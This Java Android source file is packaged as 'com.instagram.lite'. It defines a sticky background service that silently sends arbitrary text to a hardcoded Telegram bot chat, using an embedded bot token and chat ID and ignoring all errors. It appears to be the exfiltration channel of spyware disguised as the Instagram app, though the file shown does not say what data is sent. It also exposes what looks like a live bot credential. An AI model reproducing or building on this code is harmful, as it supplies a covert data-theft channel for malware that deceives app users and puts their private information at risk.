package com.instagram.lite;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class TelegramService extends Service {
    static final String BOT = "8645952826:AAGcMdI7MKuVFOzT0ski8Ecv39qrAvekOdc";
    static final String CHAT = "8528084635";
    
    @Override public int onStartCommand(Intent i, int f, int id) {
        return START_STICKY;
    }
    
    public void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + BOT + "/sendMessage?chat_id=" + CHAT + "&text=" + URLEncoder.encode(text, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch(Exception e) {}
        }).start();
    }
    
    @Override public IBinder onBind(Intent i) { return null; }
}